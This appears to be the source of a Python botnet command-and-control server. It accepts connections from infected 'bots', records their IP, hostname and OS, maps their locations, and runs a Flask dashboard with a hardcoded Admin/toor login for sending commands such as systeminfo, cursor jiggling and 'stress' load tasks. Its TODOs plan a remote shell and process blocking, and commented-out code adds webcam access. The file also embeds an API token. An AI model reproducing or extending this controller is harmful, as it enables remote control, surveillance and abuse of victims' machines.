import os
import re
import httpx
import ctypes
import shutil
import geocoder
import folium
import ipinfo
import socket
import platform
import datetime
import threading

from cookies_package import curl_download_github, obfusacate
from concurrent.futures.thread import ThreadPoolExecutor
from flask_socketio import SocketIO
from typing import Tuple
from time import sleep
from pystyle import *
from tkinter import *
from flask import *


'''
TODO Add shell tab back in

TODO Add public ip to list for map usage

TODO Add button to client list to instantly kill client, and button to be able to "open" client's terminal (same as output terminal but looks like a terminal)

TODO Be able to search through client list

TODO Add radio button to be able to select all clients

TODO Put client list into container and add a header (search bar -right) (Bots: 0 -middle) (Show x entries)

TODO Process control (be able to block a process from running)
'''


RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
END = '\033[0m'

debug = True
if debug: print(YELLOW + "DEBUG MODE ENABLED" + END)
# if not debug then print_debug() will not print anything
if os.path.exists("log.txt"): os.remove("log.txt")
def print_debug(str): 
	if debug:
		print(f"{END}[{RED}DEBUG{END}] " + END + str)
		with open ("log.txt", "a+") as f: f.write(f"[DEBUG]  {str}\n")

		
# Server info
ippp 	= "192.168.0.2"
port 	= 1888

#region Variables

global command_input
command_input = ""

# Web GUI
app 			= Flask(__name__)
socketio 		= SocketIO(app)
app.secret_key 	= os.urandom(12)

# Login info
user1 			= 'Admin'	# Username
pass1 			= 'toor'	# Password

# Client info
public_ips 		= []	# Client IP list	
hostname_list 	= []	# Collects Hostname list
all_connections = []	# list of all connections
all_address 	= []	# list of all addresses
idNum       	= 0		# Bot ID number
database    	= []	# list of all clients
out 			= ""	# Command output

temp 			= os.getenv('temp')
stop 			= False	
#endregion

# Client class
class client:
    def __init__(self, info):
        global idNum
        self.idNum = idNum
        idNum += 1
        self.persistence = False
        self.IP = info['IP']
        self.hostname = info['hostname']
        self.OS = info['OS']
        self.status = info['status']


#region Threads
def check_online(i):
    try:
        all_connections[i].send("ping".encode())
        answer = all_connections[i].recv(1024*5).decode("ascii")

        if answer == "pong": return "Online"
        else: return "Offline"
    except BrokenPipeError: return "Offline"
    except: return "Offline"

def last_online():
	while True: 
		if database != []:
			if all_connections != []:
				print_debug("Client Status Check Thread: Checking which clients are online")
				for i in range(len(database)):
					try: 
						database[i].status = check_online(i)
					except BrokenPipeError:
						del all_address[i]
						del all_connections[i]
			else:
				try:
					print_debug("Client Status Check Thread: No connections changing all clients to offline")
					for i in database:
						i.status = "Offline"
				except: pass
		else:
			print_debug("Client Status Check Thread: Database is empty")
		sleep(5)

def map_update():
	global public_ips
	access_token = '98202d3de7c279'
	handler = ipinfo.getHandler(access_token)

	while True:
		ips = []

		try:
			# grab ip addresses from txt file (FOR TESTING)
			with open("ips.txt", "r") as f: 
				for line in f: ips.append(line.strip())


			mypi2 = handler.getDetails("198.58.117.105")	# get my ip location						
			lat = mypi2.loc.split(",")[0]					# sperate lat and long
			long = mypi2.loc.split(",")[1]
			location = [lat, long]
			mapp = folium.Map(zoom_start=4, min_zoom=3, location=location, tiles="Stamen Terrain")            # create map
			mapp.fit_bounds([[52.193636, -2.221575], [52.636878, -1.139759]])
			folium.Marker(location, tooltip="SERVER").add_to(mapp)


			for i in public_ips:
				try: 
					mypi = handler.getDetails(i)
					lat = mypi.loc.split(",")[0]
					long = mypi.loc.split(",")[1]
					location = [lat, long]
					folium.Marker(location, tooltip=f"IP: {i}").add_to(mapp)	# add marker to map
				except: pass

			for i in ips:
				try: 
					mypi = handler.getDetails(i)
					lat = mypi.loc.split(",")[0]
					long = mypi.loc.split(",")[1]
					location = [lat, long]
					folium.Marker(location, tooltip=f"IP: {i}").add_to(mapp)	# add marker to map
				except: pass
				
			mapp.save("templates\\map_data.html")
		except Exception as e: print_debug("Map Update Thread: " + str(e))
		
		sleep(5)
#endregion

threading.Thread(target=last_online).start()
threading.Thread(target=map_update).start()

#region ACE Server
def collect():
	global hostname_list
	hostname_list = []
	while not stop:
		try:
			conn, address = sock.accept()
			all_connections.append(conn)
			all_address.append(address)
		except socket.timeout: continue
		except socket.error: continue
		except Exception as e: print_debug("Error accepting connections: " + str(e))
		try:
			all_connections[-1].send("sendinfo".encode())
			out = f'{all_connections[-1].recv(1024*5).decode("ascii")}'

			out = out.split()
			info = {}
			info['COMMAND'] 	= 'INFO'
			if hostname_list != []:					# if there are clients in the list
				if out[1] not in hostname_list:
					info["IP"] 			= out[0]
					info["hostname"] 	= out[1]
					info["OS"] 			= out[2]
					info["status"]  	= str(out[3])
					print_debug("Collect Thread: --INFO--  Client IP: " + str(out[0]) + " Hostname: " + str(out[1]) + " OS: " + str(out[2]) + " Status: " + str(out[3]))

					hostname_list.append(out[1])		# add client to list
					database.append(client(info))
				else: print_debug("Collect Thread: client already in database")
			else:
				print_debug("Collect Thread: No clients in list adding new client")
				print_debug("Collect Thread: --INFO--  Client IP: " + str(out[0]) + " Hostname: " + str(out[1]) + " OS: " + str(out[2]) + " Status: " + str(out[3]))
				info["IP"] 			= out[0]
				info["hostname"] 	= out[1]
				info["OS"] 			= out[2]
				info["status"]  	= str(out[3])

				hostname_list.append(out[1])
				database.append(client(info))
		except BrokenPipeError:
			del all_address[-1]
			del all_connections[-1]
		sleep(0.5)

def check(display:bool=False, always:bool=True):
	global all_ids
	while not stop:
		c=0
		for n,tcp in zip(all_address,all_connections):	# loop through all clients
			c+=1
			try:
				tcp.send(str.encode("ping"))
				if tcp.recv(1024).decode("utf-8") and display: print(f'[+]    {str(n[0])+":"+str(n[1])}    LIVE')
			except:
				if display: print(f'[+]    {str(n[0])+":"+str(n[1])}    DEAD')
				del all_address[c-1]
				del all_connections[c-1]
				continue
		if not always: break
		sleep(0.5)

def _bind(connect:Tuple[str,int]) -> bool:
	global sock
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.bind(connect)
		sock.listen(50)
		sock.settimeout(0.5)

		print_debug("Bind Thread: Socket bound successfully starting to collect connections")

		threading.Thread(target=collect).start()
		threading.Thread(target=check).start()
		return True
	except: pass

def call_script(i, cmd):
	try:
		all_connections[i].send(cmd.encode())
		return (f'{all_connections[i].recv(1024*5).decode("ascii")}')
	except BrokenPipeError:
		del all_address[i]
		del all_connections[i]

#endregion

def _take_cmd(bot, cmd):
	if cmd == "admincheck": 
		return call_script(bot, cmd)

	elif cmd == "jigglecursor":
		return call_script(bot, cmd)

	elif cmd == "jigglecursorstop":
		return call_script(bot, cmd)

	elif cmd == "systeminfo":
		return call_script(bot, cmd)


	elif "stress" in cmd:
		return call_script(bot, cmd)	
	
	else: return(f"Error: {cmd} is not a valid command")

#region Web GUI
@app.route('/')
def redirectLogin(): return redirect(url_for('login'))


@app.route('/login.html', methods=['post', 'get'])
def login():
	if request.method == 'POST':
		username = request.form.get('userid')
		password = request.form.get('passid')
		if username == user1 and password == pass1:
			session['loggedin'] = True
			session['username'] = user1
			print_debug("Login Thread: User " + user1 + " logged in successfully")
			return redirect(url_for('dashboard'))
		else:
			return render_template('login.html')
			
	
	return render_template('login.html')


@app.route('/dashboard.html')
def dashboard():
	try:
		if session['loggedin'] == True: return render_template('dashboard.html', database=database)
	except: return redirect('login.html')


@app.route('/map.html')
def map():
	try:
		if session['loggedin'] == True: return render_template('map.html')
	except: return redirect('login.html')


@app.route('/map_data.html')
def map_data():
	try:
		if session['loggedin'] == True: return render_template('map_data.html')
	except: return redirect('login.html')

def command_check(command):
	if command == "stress": 
		stress_time = request.form.get('stress-time')
		stress_amount = request.form.get('stress-tasks')
		return (f'{command} {stress_time} {stress_amount}')

	else: return command


@app.route('/sendcommands.html', methods=['get', 'post'])
def sendcommands():
	try:
		global out
		if session['loggedin']:				# if user is logged in
			if request.method == 'POST':	# if user is sending commands
				idNumber = request.form.get('idNumber')
				command_ = request.form.get('command-selection')
				command = ""
				command += str(command_check(str(command_)))

				print_debug("Sending command: " + str(command) + " to system ID num: " + str(idNumber))

				if database == []: return render_template('sendcommands.html', commandStatus='No connected clients', out=out)

				if command == "clear":
					out = "" # clear output
					return render_template('sendcommands.html', commandStatus='Output Cleared', commandOutput=out)
				
				else:
					for x in database:
						if str(x.idNum) == str(idNumber):
							try: 
								out += "\n\n" + x.hostname + ": " + _take_cmd(int(x.idNum), str(command))
								return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
							except Exception as e: 
								print_debug("Error while sending command" + str(e))
								return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
					return render_template('sendcommands.html', commandStatus='System ID not found', commandOutput=out)
			else: return render_template('sendcommands.html', commandOutput=out)

	except Exception as e:
		print_debug(f"Error while sending command: {e}")
		return redirect('login.html')


@app.route('/logout.html')
def logout():
	session.pop('loggedin', None)
	session.pop('username', None)
	return redirect(url_for('login'))

if _bind((ippp, port)): print_debug(f'Server started on {ippp}:{port}')
socketio.run(app.run())
#endregion


###################################################################################################################################################################################################
###################################################################################################################################################################################################
###################################################################################################################################################################################################

#region OLD Commands

# elif "webcam" in cmd:
# 	bots = ''
# 	for i, (ip, port) in enumerate(all_address):
# 		try:
# 			bots +=(f'{[i]}    {public_ips[i]}    CONNECTED{RESET}\n')
# 		except:
# 			bots +=(f'{[i]}    {ip}:{port}    CONNECTED{RESET}\n')
# 	print_logo()
# 	print("\n\t\tClients\t")
#	print("-----------------------------------------" + "\n" + bots)
# 	b = int(input(f"\n    {RED}{dot}{WHITE} Bot\t{CYAN}: {RESET}"))
# 	
# 	print("\n")
# 	_port = Write.Input("Enter Port >> ", Colors.purple_to_blue, interval=0.0002)
# 	_create_webcam_server(_port)
# 	clear()
# 	print_logo()
# 	Write.Input("MAKE SURE TO RUN THE WEBCAM SERVER BEFORE GOING ANY FURTHER", Colors.red_to_white, interval=0.0002)
# 	print("\n")
# 	with ThreadPoolExecutor(max_workers=25) as executor:
# 		for i, (ip, port) in enumerate(all_address):
# 			if i == b:
# 				executor.submit(call_script, i, ip, port, cmd)
# 			elif b == 420:
# 				executor.submit(call_script, i, ip, port, cmd)

#endregion
